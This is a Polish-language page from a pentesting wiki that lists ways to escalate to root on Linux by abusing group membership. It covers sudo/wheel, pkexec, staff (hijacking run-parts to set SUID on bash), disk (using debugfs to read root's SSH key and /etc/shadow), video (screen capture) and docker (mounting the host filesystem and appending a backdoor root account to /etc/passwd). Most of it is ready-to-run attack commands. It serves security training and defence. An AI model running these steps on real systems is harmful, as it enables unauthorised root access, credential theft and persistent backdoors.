# Ciekawe Grupy - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupy Sudo/Admin

### **PE - Metoda 1**

**Czasami**, **domyślnie (lub ponieważ niektóre oprogramowanie tego potrzebuje)** w pliku **/etc/sudoers** możesz znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik, który należy do grupy sudo lub admin, może wykonywać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```
sudo su
```
### PE - Metoda 2

Znajdź wszystkie binarki suid i sprawdź, czy istnieje binarka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli odkryjesz, że binarny plik **pkexec jest binarnym plikiem SUID** i należysz do **sudo** lub **admin**, prawdopodobnie będziesz mógł wykonywać binaria jako sudo za pomocą `pkexec`.\
Dzieje się tak, ponieważ zazwyczaj są to grupy w ramach **polkit policy**. Ta polityka zasadniczo identyfikuje, które grupy mogą używać `pkexec`. Sprawdź to za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tam znajdziesz, które grupy mają prawo do wykonywania **pkexec**, a **domyślnie** w niektórych dystrybucjach Linuksa pojawiają się grupy **sudo** i **admin**.

Aby **stać się rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli spróbujesz wykonać **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. A tutaj jest obejście tego problemu: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupa Wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** możesz znaleźć tę linię:
```
%wheel	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik, który należy do grupy wheel, może wykonywać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```
sudo su
```
## Shadow Group

Użytkownicy z **grupy shadow** mogą **czytać** plik **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, przeczytaj plik i spróbuj **złamać niektóre hashe**.

## Grupa Pracowników

**staff**: Pozwala użytkownikom na dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez potrzeby posiadania uprawnień roota (zauważ, że pliki wykonywalne w `/usr/local/bin` są w zmiennej PATH każdego użytkownika i mogą "nadpisywać" pliki wykonywalne w `/bin` i `/usr/bin` o tej samej nazwie). Porównaj z grupą "adm", która jest bardziej związana z monitorowaniem/bezpieczeństwem. [\[source\]](https://wiki.debian.org/SystemGroups)

W dystrybucjach debiana, zmienna `$PATH` pokazuje, że `/usr/local/` będzie uruchamiana z najwyższym priorytetem, niezależnie od tego, czy jesteś użytkownikiem z uprawnieniami, czy nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Jeśli możemy przejąć niektóre programy w `/usr/local`, możemy łatwo uzyskać dostęp do roota.

Przejęcie programu `run-parts` to łatwy sposób na uzyskanie roota, ponieważ większość programów uruchomi `run-parts`, jak (crontab, podczas logowania przez ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
lub gdy nowe logowanie do sesji ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Eksploatacja**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa dysków

To uprawnienie jest prawie **równoważne z dostępem root** ponieważ możesz uzyskać dostęp do wszystkich danych wewnątrz maszyny.

Pliki:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs możesz również **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz to zrobić:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednakże, jeśli spróbujesz **zapisać pliki należące do roota** (takie jak `/etc/shadow` lub `/etc/passwd`), otrzymasz błąd "**Permission denied**".

## Grupa Wideo

Używając polecenia `w`, możesz znaleźć **kto jest zalogowany w systemie** i wyświetli ono wynik podobny do poniższego:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do wyświetlania wyjścia ekranu. W zasadzie możesz obserwować ekrany. Aby to zrobić, musisz **złapać bieżący obraz na ekranie** w surowych danych i uzyskać rozdzielczość, którą używa ekran. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **surowy obraz**, możesz użyć **GIMP**, wybrać plik **`screen.raw`** i wybrać jako typ pliku **Dane surowego obrazu**:

![](<../../../images/image (463).png>)

Następnie zmodyfikuj Szerokość i Wysokość na te używane na ekranie i sprawdź różne Typy obrazów (i wybierz ten, który najlepiej pokazuje ekran):

![](<../../../images/image (317).png>)

## Grupa Root

Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usług** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być użyte do eskalacji uprawnień...

**Sprawdź, które pliki członkowie root mogą modyfikować**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Możesz **zamontować system plików root maszyny hosta do woluminu instancji**, więc gdy instancja się uruchamia, natychmiast ładuje `chroot` do tego woluminu. To skutecznie daje ci uprawnienia root na maszynie.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Na koniec, jeśli nie podoba Ci się żadna z wcześniejszych sugestii lub z jakiegoś powodu nie działają (firewall API dockera?), zawsze możesz spróbować **uruchomić kontener z uprawnieniami i uciec z niego**, jak wyjaśniono tutaj:

{{#ref}}
../docker-security/
{{#endref}}

Jeśli masz uprawnienia do zapisu w gnieździe dockera, przeczytaj [**ten post o tym, jak eskalować uprawnienia, nadużywając gniazda dockera**](../#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupa lxc/lxd

{{#ref}}
./
{{#endref}}

## Grupa Adm

Zazwyczaj **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików dziennika** znajdujących się w _/var/log/_.\
Dlatego, jeśli skompromitowałeś użytkownika w tej grupie, zdecydowanie powinieneś **sprawdzić logi**.

## Grupa Auth

W OpenBSD grupa **auth** zazwyczaj może pisać w folderach _**/etc/skey**_ i _**/var/db/yubikey**_, jeśli są używane.\
Te uprawnienia mogą być nadużywane za pomocą następującego exploita, aby **eskalować uprawnienia** do roota: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
